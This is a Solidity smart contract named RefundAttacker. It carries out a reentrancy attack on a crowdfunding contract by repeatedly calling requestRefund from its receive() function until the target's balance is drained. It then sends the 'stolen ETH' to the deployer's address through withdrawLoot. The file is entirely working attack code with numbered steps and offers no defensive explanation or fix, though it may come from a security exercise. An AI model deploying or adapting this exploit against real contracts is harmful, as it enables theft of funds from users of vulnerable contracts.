// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;


interface ICrowdfundVulnerable {
    function contribute() external payable;
    function requestRefund() external;
    function contributions(address user) external view returns (uint256);
}

contract RefundAttacker {
    
    address payable public attacker;

    
    ICrowdfundVulnerable public vulnerable;
    uint256 public lastContributionAmount;

    modifier onlyAttacker() {
        require(msg.sender == attacker, "Not attacker");
        _;
    }

    constructor(address _vulnerable) {
        attacker = payable(msg.sender);
        vulnerable = ICrowdfundVulnerable(_vulnerable);
    }

    // STEP 1: EOA sends ETH into attacker contract
    function fundAttacker() external payable onlyAttacker {}

    // STEP 2: Contribute attacker contract balance into the crowdfund
    function contributeFromContract(uint256 amount) external onlyAttacker {
        require(amount > 0, "Amount required");
        require(address(this).balance >= amount, "Insufficient attacker balance");

        lastContributionAmount = amount;
        vulnerable.contribute{value: amount}();
    }

    // STEP 3: Trigger reentrancy (no ETH should be forwarded)
    function runAttack(uint256 amount) external onlyAttacker {
        require(amount > 0, "Amount required");
        require(amount == lastContributionAmount, "Amount must match contribution");
        require(vulnerable.contributions(address(this)) >= amount, "Crowdfund contribution missing");
        vulnerable.requestRefund();
    }

    // STEP 4: Reentrancy loop – called when vulnerable sends ETH back
    receive() external payable {
        if (address(vulnerable).balance >= lastContributionAmount && lastContributionAmount > 0) {
            vulnerable.requestRefund();
        }
    }

    // STEP 5: Withdraw stolen ETH from attacker contract to attacker EOA
    function withdrawLoot() external onlyAttacker {
        uint256 bal = address(this).balance;
        require(bal > 0, "No loot");
        attacker.transfer(bal);
    }
}
